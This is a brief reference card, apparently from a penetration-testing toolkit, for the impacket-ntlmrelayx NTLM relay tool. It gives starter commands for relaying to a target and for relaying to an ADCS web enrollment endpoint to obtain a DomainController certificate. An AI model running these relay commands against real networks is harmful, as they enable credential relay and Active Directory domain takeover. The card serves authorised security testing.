# impacket-ntlmrelayx

**Category**: NTLM relay, coercion, and ADCS relay chains

**Purpose**: NTLM relay to SMB/LDAP/HTTP/ADCS targets.

**When to use**: Use when NTLM relay, ADCS web enrollment, IPv6 poisoning, EFSRPC/MS-RPRN coercion, or machine account abuse is in scope.

## Commands
- `impacket-ntlmrelayx`
- `ntlmrelayx.py`

## First Commands
- `impacket-ntlmrelayx -t TARGET --no-smb2support`
- `impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController`

## Notes
Pair with coercion tools or mitm6; verify SMB signing and relay target viability.

## Captured Help
No live help output was captured. Start with the commands above, or run the tool with `-h`/`--help` in the sandbox.
